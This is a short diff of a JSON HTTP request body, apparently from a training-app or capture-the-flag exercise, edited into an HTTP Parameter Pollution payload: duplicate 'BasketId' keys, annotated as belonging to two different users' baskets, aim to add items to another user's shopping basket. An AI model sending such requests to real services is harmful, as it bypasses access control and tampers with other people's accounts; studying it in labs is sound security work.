@@ -15,9 +15,9 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 
-{
-    "ProductId": 1,
-    "BasketId": 7,
-    "BasketId": 6,
+{ // Exploit via HTTP Parameter Pollution (HPP)
+    "ProductId": 3,
+    "BasketId": "7", // erer's basket
+    "BasketId": "6", // twe's basket
     "quantity": 5
 }
